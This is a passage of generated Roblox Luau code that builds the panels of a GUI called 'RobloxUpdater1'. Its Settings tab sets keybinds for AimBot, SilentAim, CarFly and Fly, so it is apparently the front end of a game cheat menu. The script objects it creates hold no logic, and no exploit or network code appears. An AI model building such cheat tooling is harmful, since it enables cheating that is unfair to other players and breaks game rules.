UI["248"]["Name"] = [[Stats]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.TEXT \\ --
UI["249"] = Instance.new("TextLabel", UI["248"])
UI["249"]["BorderSizePixel"] = 0
UI["249"]["TextTransparency"] = 0.44
UI["249"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["249"]["TextSize"] = 28
UI["249"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["249"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["249"]["BackgroundTransparency"] = 1
UI["249"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["249"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["249"]["Text"] = [[Stats Tab]]
UI["249"]["Name"] = [[TEXT]]
UI["249"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.TEXT.UICorner \\ --
UI["24a"] = Instance.new("UICorner", UI["249"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.TEXT.Underline \\ --
UI["24b"] = Instance.new("Frame", UI["249"])
UI["24b"]["BorderSizePixel"] = 0
UI["24b"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["24b"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["24b"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["24b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["24b"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.UIGradient \\ --
UI["24c"] = Instance.new("UIGradient", UI["248"])
UI["24c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container \\ --
UI["24d"] = Instance.new("TextButton", UI["248"])
UI["24d"]["BorderSizePixel"] = 0
UI["24d"]["AutoButtonColor"] = false
UI["24d"]["TextSize"] = 36
UI["24d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["24d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["24d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["24d"]["Size"] = UDim2.new(0, 193, 0, 46)
UI["24d"]["BackgroundTransparency"] = 0.85
UI["24d"]["Name"] = [[Container]]
UI["24d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["24d"]["Text"] = [[Container]]
UI["24d"]["Position"] = UDim2.new(0.01921, 0, 0.25771, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.UICorner \\ --
UI["24e"] = Instance.new("UICorner", UI["24d"])
UI["24e"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.UIStroke \\ --
UI["24f"] = Instance.new("UIStroke", UI["24d"])
UI["24f"]["Transparency"] = 0.63
UI["24f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["24f"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.UIGradient \\ --
UI["250"] = Instance.new("UIGradient", UI["24d"])
UI["250"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.animation \\ --
UI["251"] = Instance.new("LocalScript", UI["24d"])
UI["251"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.click to tp \\ --
UI["252"] = Instance.new("TextLabel", UI["24d"])
UI["252"]["TextWrapped"] = true
UI["252"]["BorderSizePixel"] = 0
UI["252"]["TextTransparency"] = 0.32
UI["252"]["TextScaled"] = true
UI["252"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["252"]["TextSize"] = 74
UI["252"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["252"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["252"]["BackgroundTransparency"] = 1
UI["252"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["252"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["252"]["Text"] = [[Shows status from Container]]
UI["252"]["Name"] = [[click to tp]]
UI["252"]["Position"] = UDim2.new(-0.00518, 0, 1.07749, 6)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.Function \\ --
UI["253"] = Instance.new("LocalScript", UI["24d"])
UI["253"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1 \\ --
UI["254"] = Instance.new("TextButton", UI["248"])
UI["254"]["BorderSizePixel"] = 0
UI["254"]["TextSize"] = 35
UI["254"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["254"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["254"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["254"]["Size"] = UDim2.new(0, 192, 0, 46)
UI["254"]["BackgroundTransparency"] = 0.85
UI["254"]["Name"] = [[Container1]]
UI["254"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["254"]["Text"] = [[Container1]]
UI["254"]["Position"] = UDim2.new(0.51921, 0, 0.25738, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.UICorner \\ --
UI["255"] = Instance.new("UICorner", UI["254"])
UI["255"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.UIStroke \\ --
UI["256"] = Instance.new("UIStroke", UI["254"])
UI["256"]["Transparency"] = 0.63
UI["256"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["256"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.TextLabel 1 \\ --
UI["257"] = Instance.new("TextLabel", UI["254"])
UI["257"]["TextWrapped"] = true
UI["257"]["BorderSizePixel"] = 0
UI["257"]["TextTransparency"] = 0.32
UI["257"]["TextScaled"] = true
UI["257"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["257"]["TextSize"] = 74
UI["257"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["257"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["257"]["BackgroundTransparency"] = 1
UI["257"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["257"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["257"]["Text"] = [[Shows status from Container]]
UI["257"]["Name"] = [[TextLabel 1]]
UI["257"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.UIGradient \\ --
UI["258"] = Instance.new("UIGradient", UI["254"])
UI["258"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.animation \\ --
UI["259"] = Instance.new("LocalScript", UI["254"])
UI["259"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.Function \\ --
UI["25a"] = Instance.new("LocalScript", UI["254"])
UI["25a"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank \\ --
UI["25b"] = Instance.new("TextButton", UI["248"])
UI["25b"]["BorderSizePixel"] = 0
UI["25b"]["TextSize"] = 35
UI["25b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["25b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["25b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["25b"]["Size"] = UDim2.new(0, 193, 0, 46)
UI["25b"]["BackgroundTransparency"] = 0.85
UI["25b"]["Name"] = [[Bank]]
UI["25b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["25b"]["Text"] = [[Bank]]
UI["25b"]["Position"] = UDim2.new(0.01921, 0, 0.66568, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.UICorner \\ --
UI["25c"] = Instance.new("UICorner", UI["25b"])
UI["25c"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.UIStroke \\ --
UI["25d"] = Instance.new("UIStroke", UI["25b"])
UI["25d"]["Transparency"] = 0.63
UI["25d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["25d"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.TextLabel 1 \\ --
UI["25e"] = Instance.new("TextLabel", UI["25b"])
UI["25e"]["TextWrapped"] = true
UI["25e"]["BorderSizePixel"] = 0
UI["25e"]["TextTransparency"] = 0.32
UI["25e"]["TextScaled"] = true
UI["25e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["25e"]["TextSize"] = 74
UI["25e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["25e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["25e"]["BackgroundTransparency"] = 1
UI["25e"]["Size"] = UDim2.new(0, 204, 0, 16)
UI["25e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["25e"]["Text"] = [[Shows status from Bank]]
UI["25e"]["Name"] = [[TextLabel 1]]
UI["25e"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.UIGradient \\ --
UI["25f"] = Instance.new("UIGradient", UI["25b"])
UI["25f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.animation \\ --
UI["260"] = Instance.new("LocalScript", UI["25b"])
UI["260"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.Function \\ --
UI["261"] = Instance.new("LocalScript", UI["25b"])
UI["261"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.UICorner \\ --
UI["262"] = Instance.new("UICorner", UI["248"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club \\ --
UI["263"] = Instance.new("TextButton", UI["248"])
UI["263"]["BorderSizePixel"] = 0
UI["263"]["TextSize"] = 35
UI["263"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["263"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["263"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["263"]["Size"] = UDim2.new(0, 192, 0, 46)
UI["263"]["BackgroundTransparency"] = 0.85
UI["263"]["Name"] = [[Club]]
UI["263"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["263"]["Text"] = [[Soon]]
UI["263"]["Position"] = UDim2.new(0.51921, 0, 0.66568, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club.UICorner \\ --
UI["264"] = Instance.new("UICorner", UI["263"])
UI["264"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club.UIStroke \\ --
UI["265"] = Instance.new("UIStroke", UI["263"])
UI["265"]["Transparency"] = 0.63
UI["265"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["265"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club.TextLabel 1 \\ --
UI["266"] = Instance.new("TextLabel", UI["263"])
UI["266"]["TextWrapped"] = true
UI["266"]["BorderSizePixel"] = 0
UI["266"]["TextTransparency"] = 0.32
UI["266"]["TextScaled"] = true
UI["266"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["266"]["TextSize"] = 74
UI["266"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["266"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["266"]["BackgroundTransparency"] = 1
UI["266"]["Size"] = UDim2.new(0, 204, 0, 16)
UI["266"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["266"]["Text"] = [[Shows status from Club]]
UI["266"]["Name"] = [[TextLabel 1]]
UI["266"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club.UIGradient \\ --
UI["267"] = Instance.new("UIGradient", UI["263"])
UI["267"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club.animation \\ --
UI["268"] = Instance.new("LocalScript", UI["263"])
UI["268"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings \\ --
UI["269"] = Instance.new("Frame", UI["e"])
UI["269"]["Visible"] = false
UI["269"]["BorderSizePixel"] = 0
UI["269"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["269"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["269"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["269"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["269"]["Name"] = [[Settings]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.UICorner \\ --
UI["26a"] = Instance.new("UICorner", UI["269"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.Underline \\ --
UI["26b"] = Instance.new("Frame", UI["269"])
UI["26b"]["BorderSizePixel"] = 0
UI["26b"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["26b"]["Size"] = UDim2.new(0, 3, 0, -193)
UI["26b"]["Position"] = UDim2.new(0.4955, 0, 0.96403, 0)
UI["26b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["26b"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.TEXT \\ --
UI["26c"] = Instance.new("TextLabel", UI["269"])
UI["26c"]["BorderSizePixel"] = 0
UI["26c"]["TextTransparency"] = 0.44
UI["26c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["26c"]["TextSize"] = 28
UI["26c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["26c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["26c"]["BackgroundTransparency"] = 1
UI["26c"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["26c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["26c"]["Text"] = [[Settings]]
UI["26c"]["Name"] = [[TEXT]]
UI["26c"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.TEXT.UICorner \\ --
UI["26d"] = Instance.new("UICorner", UI["26c"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.TEXT.Underline \\ --
UI["26e"] = Instance.new("Frame", UI["26c"])
UI["26e"]["BorderSizePixel"] = 0
UI["26e"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["26e"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["26e"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["26e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["26e"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.UIGradient \\ --
UI["26f"] = Instance.new("UIGradient", UI["269"])
UI["26f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey \\ --
UI["270"] = Instance.new("TextButton", UI["269"])
UI["270"]["Active"] = false
UI["270"]["BorderSizePixel"] = 0
UI["270"]["TextSize"] = 41
UI["270"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["270"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["270"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["270"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["270"]["BackgroundTransparency"] = 0.85
UI["270"]["Name"] = [[AimBotKey]]
UI["270"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["270"]["Text"] = [[]]
UI["270"]["Position"] = UDim2.new(0.02597, 0, 0.30826, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey.TextLabel 1 \\ --
UI["271"] = Instance.new("TextLabel", UI["270"])
UI["271"]["TextWrapped"] = true
UI["271"]["BorderSizePixel"] = 0
UI["271"]["TextTransparency"] = 0.32
UI["271"]["TextScaled"] = true
UI["271"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["271"]["TextSize"] = 74
UI["271"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["271"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["271"]["BackgroundTransparency"] = 1
UI["271"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["271"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["271"]["Text"] = [[AimBot Key:]]
UI["271"]["Name"] = [[TextLabel 1]]
UI["271"]["Position"] = UDim2.new(-0.00518, 0, -0.56332, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey.UICorner \\ --
UI["272"] = Instance.new("UICorner", UI["270"])
UI["272"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey.UIStroke \\ --
UI["273"] = Instance.new("UIStroke", UI["270"])
UI["273"]["Transparency"] = 0.63
UI["273"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["273"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey.TextBox \\ --
UI["274"] = Instance.new("TextBox", UI["270"])
UI["274"]["TextColor3"] = Color3.fromRGB(0, 209, 255)
UI["274"]["BorderSizePixel"] = 0
UI["274"]["TextWrapped"] = true
UI["274"]["TextSize"] = 41
UI["274"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["274"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["274"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["274"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["274"]["Text"] = [[L]]
UI["274"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey.TextBox.Function \\ --
UI["275"] = Instance.new("LocalScript", UI["274"])
UI["275"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey \\ --
UI["276"] = Instance.new("TextButton", UI["269"])
UI["276"]["Active"] = false
UI["276"]["BorderSizePixel"] = 0
UI["276"]["TextSize"] = 41
UI["276"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["276"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["276"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["276"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["276"]["BackgroundTransparency"] = 0.85
UI["276"]["Name"] = [[SilentAimKey]]
UI["276"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["276"]["Text"] = [[]]
UI["276"]["Position"] = UDim2.new(0.02371, 0, 0.65178, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey.TextLabel 1 \\ --
UI["277"] = Instance.new("TextLabel", UI["276"])
UI["277"]["TextWrapped"] = true
UI["277"]["BorderSizePixel"] = 0
UI["277"]["TextTransparency"] = 0.32
UI["277"]["TextScaled"] = true
UI["277"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["277"]["TextSize"] = 74
UI["277"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["277"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["277"]["BackgroundTransparency"] = 1
UI["277"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["277"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["277"]["Text"] = [[SilentAim Key:]]
UI["277"]["Name"] = [[TextLabel 1]]
UI["277"]["Position"] = UDim2.new(-0.00518, 0, -0.56332, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey.UICorner \\ --
UI["278"] = Instance.new("UICorner", UI["276"])
UI["278"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey.UIStroke \\ --
UI["279"] = Instance.new("UIStroke", UI["276"])
UI["279"]["Transparency"] = 0.63
UI["279"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["279"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey.TextBox \\ --
UI["27a"] = Instance.new("TextBox", UI["276"])
UI["27a"]["TextColor3"] = Color3.fromRGB(0, 209, 255)
UI["27a"]["BorderSizePixel"] = 0
UI["27a"]["TextWrapped"] = true
UI["27a"]["TextSize"] = 41
UI["27a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["27a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["27a"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["27a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["27a"]["Text"] = [[K]]
UI["27a"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey.TextBox.Function \\ --
UI["27b"] = Instance.new("LocalScript", UI["27a"])
UI["27b"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey \\ --
UI["27c"] = Instance.new("TextButton", UI["269"])
UI["27c"]["Active"] = false
UI["27c"]["BorderSizePixel"] = 0
UI["27c"]["TextSize"] = 41
UI["27c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["27c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["27c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["27c"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["27c"]["BackgroundTransparency"] = 0.85
UI["27c"]["Name"] = [[CarFlyKey]]
UI["27c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["27c"]["Text"] = [[]]
UI["27c"]["Position"] = UDim2.new(0.53723, 0, 0.65178, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey.TextLabel 1 \\ --
UI["27d"] = Instance.new("TextLabel", UI["27c"])
UI["27d"]["TextWrapped"] = true
UI["27d"]["BorderSizePixel"] = 0
UI["27d"]["TextTransparency"] = 0.32
UI["27d"]["TextScaled"] = true
UI["27d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["27d"]["TextSize"] = 74
UI["27d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["27d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["27d"]["BackgroundTransparency"] = 1
UI["27d"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["27d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["27d"]["Text"] = [[CarFly Key:]]
UI["27d"]["Name"] = [[TextLabel 1]]
UI["27d"]["Position"] = UDim2.new(-0.00518, 0, -0.56332, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey.UICorner \\ --
UI["27e"] = Instance.new("UICorner", UI["27c"])
UI["27e"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey.UIStroke \\ --
UI["27f"] = Instance.new("UIStroke", UI["27c"])
UI["27f"]["Transparency"] = 0.63
UI["27f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["27f"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey.TextBox \\ --
UI["280"] = Instance.new("TextBox", UI["27c"])
UI["280"]["TextColor3"] = Color3.fromRGB(0, 209, 255)
UI["280"]["BorderSizePixel"] = 0
UI["280"]["TextWrapped"] = true
UI["280"]["TextSize"] = 41
UI["280"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["280"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["280"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["280"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["280"]["Text"] = [[X]]
UI["280"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey.TextBox.Function \\ --
UI["281"] = Instance.new("LocalScript", UI["280"])
UI["281"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey \\ --
UI["282"] = Instance.new("TextButton", UI["269"])
UI["282"]["Active"] = false
UI["282"]["BorderSizePixel"] = 0
UI["282"]["TextSize"] = 41
UI["282"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["282"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["282"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["282"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["282"]["BackgroundTransparency"] = 0.85
UI["282"]["Name"] = [[FlyKey]]
UI["282"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["282"]["Text"] = [[]]
UI["282"]["Position"] = UDim2.new(0.53723, 0, 0.30826, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey.TextLabel 1 \\ --
UI["283"] = Instance.new("TextLabel", UI["282"])
UI["283"]["TextWrapped"] = true
UI["283"]["BorderSizePixel"] = 0
UI["283"]["TextTransparency"] = 0.32
UI["283"]["TextScaled"] = true
UI["283"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["283"]["TextSize"] = 74
UI["283"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["283"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["283"]["BackgroundTransparency"] = 1
UI["283"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["283"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["283"]["Text"] = [[Fly Key:]]
UI["283"]["Name"] = [[TextLabel 1]]
UI["283"]["Position"] = UDim2.new(-0.00518, 0, -0.56332, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey.UICorner \\ --
UI["284"] = Instance.new("UICorner", UI["282"])
UI["284"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey.UIStroke \\ --
UI["285"] = Instance.new("UIStroke", UI["282"])
UI["285"]["Transparency"] = 0.63
UI["285"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["285"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey.TextBox \\ --
UI["286"] = Instance.new("TextBox", UI["282"])
UI["286"]["TextColor3"] = Color3.fromRGB(0, 209, 255)
UI["286"]["BorderSizePixel"] = 0
UI["286"]["TextWrapped"] = true
UI["286"]["TextSize"] = 41
UI["286"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["286"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["286"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["286"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["286"]["Text"] = [[V]]
